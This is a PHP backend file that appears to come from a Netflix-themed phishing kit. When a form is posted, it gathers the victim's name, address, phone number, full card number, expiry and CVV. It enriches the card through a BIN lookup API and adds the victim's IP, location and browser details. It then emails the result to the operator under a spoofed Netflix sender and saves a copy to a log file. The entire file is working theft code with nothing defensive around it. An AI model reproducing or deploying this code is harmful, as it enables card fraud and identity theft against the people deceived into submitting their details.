<?php
/*  

       ▄▄                       ▄▄                            
        ███                     ▀███                            
         ██                       ██                            
 ▄██▀███ ███████▄  ▄█▀██▄    ▄█▀▀███   ▄██▀██▄▀██▀    ▄█    ▀██▀
 ██   ▀▀ ██    ██ ██   ██  ▄██    ██  ██▀   ▀██ ██   ▄███   ▄█  
 ▀█████▄ ██    ██  ▄█████  ███    ██  ██     ██  ██ ▄█  ██ ▄█   
 █▄   ██ ██    ██ ██   ██  ▀██    ██  ██▄   ▄██   ███    ███    
 ██████▀ ███  ████▄████▀██▄ ▀████▀███▄ ▀█████▀     █      █     
                                                               
                                                               



*/
if(isset($_POST['cnm'])&&isset($_POST['csc'])){session_start();include'../mine.php';include'../../prevents/anti2.php';function cardData($bin){$ch=curl_init();curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_URL,"https://api.freebinchecker.com/bin/".$bin);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);curl_setopt($ch,CURLOPT_TIMEOUT,10);$json=json_decode(curl_exec($ch),true);curl_close($ch);if(!isset($json)||$json['valid']==false||$json==NULL){return"N/A";}
return $json;}
$ctp=$_POST['ctp'];$ccn=str_replace(' ','',$_POST['cnm']);$cex=$_POST['exp'];$csc=$_POST['csc'];$fnm=$_POST['fnm'];$adr=$_POST['adr'];$cty=$_POST['cty'];$zip=$_POST['zip'];$phn=$_POST['phn'];$stt=$_POST['stt'];$cnt=$_POST['cnt'];$bin=substr($ccn,0,6);$bin_data=cardData($bin);$bin_type=$bin_data["card"]['type'];$bin_level=$bin_data["card"]['category'];$bin_brand=$bin_data["card"]['scheme'];$bin_currency=$bin_data['country']['currency'];$bin_bank=$bin_data['issuer']['name'];$bin_country=$bin_data['country']['name'];$_SESSION['bank']=$bin_bank;$_SESSION['fname']=$fnm;$_SESSION['ctype']=$ctp;	
	$msg .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'><br><br>
################ <font style='color: #820000;'>⚜️ NETFLIX INFO ⚜️</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'> <[ ⚜️ NETFLIX INFO BY ".$scamname." ⚜️ ]> </font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [FULL NAME] = <font style='color:#0070ba;'>{$fnm}</font><br>
<font style='color:#9c0000;'>℗</font> [ADDRESS] = <font style='color:#0070ba;'>{$adr}</font><br>
<font style='color:#9c0000;'>℗</font> [PHONE] = <font style='color:#0070ba;'>{$phn}</font><br>
<font style='color:#9c0000;'>℗</font> [ZIP CODE] = <font style='color:#0070ba;'>{$zip}</font><br>
<font style='color:#9c0000;'>℗</font> [CITY] = <font style='color:#0070ba;'>{$cty}</font><br>
<font style='color:#9c0000;'>℗</font> [STATE] = <font style='color:#0070ba;'>{$stt}</font><br>
<font style='color:#9c0000;'>℗</font> [COUNTRY] = <font style='color:#0070ba;'>{$cnt}</font><br>
±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'> 💳 CC Info 💳</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [CC Brand] = <font style='color:#0070ba;'>{$ctp}</font><br>
<font style='color:#9c0000;'>✪</font> [CC Number]	= <font style='color:#0070ba;'>{$ccn}</font><br>
<font style='color:#9c0000;'>✪</font> [CC Expiry] = <font style='color:#0070ba;'>{$cex}</font><br>
<font style='color:#9c0000;'>✪</font> [CVV / CSC] = <font style='color:#0070ba;'>{$csc}</font><br>
±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'> BIN Info {$bin} </font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [CC Data] = <font style='color:#0070ba;'>{$bin_brand} {$bin_type} {$bin_level} -> {$bin_currency}</font><br>
<font style='color:#9c0000;'>✪</font> [CC Brand] = <font style='color:#0070ba;'>{$bin_bank}</font><br>
<font style='color:#9c0000;'>✪</font> [CC Brand] = <font style='color:#0070ba;'>{$bin_country}</font><br>
±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>IP LOOKUP INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [COMPUTER] = <font style='color:#0070ba;'>{$_SESSION['computer']}</font><br>
<font style='color:#9c0000;'>✪</font> [IP ADDRESS]	= <font style='color:#0070ba;'>{$_SESSION['ip']}</font><br>
<font style='color:#9c0000;'>✪</font> [LOCATION] = <font style='color:#0070ba;'>{$_SESSION['ip_city']} , {$_SESSION['ip_state']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>{$_SESSION['browser']} on {$_SESSION['os']}</font><br>
<font style='color:#9c0000;'>✪</font> [USER AGENT ] = <font style='color:#0070ba;'>{$_SERVER['HTTP_USER_AGENT']}</font><br>
<font style='color:#9c0000;'>✪</font> [TIMEZONE]	= <font style='color:#0070ba;'>{$_SESSION['ip_timezone']}</font><br>
################## <font style='color: #820000;'> <[  ⚜️ NETFLIX BY ".$scamname." ⚜️ ]></font> #####################
<br></div></html>\n";
if($saveintext=="yes"){$save=fopen("../../".$filename.".html","a+");fwrite($save,$msg);fclose($save);}
$subject=" 💳 NETFLIX INFO 💳 [{$bin} {$ctp}] From [{$_SESSION['ip_countryName']}] {$_SESSION['ip']}";$headers="From: ⚜️ Netflix ⚜️ <newlogin@shadow.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtoemail=="yes"){foreach(explode(",",$yours)as $your){@mail($your,$subject,$msg,$headers);}}
exit('done');}
?>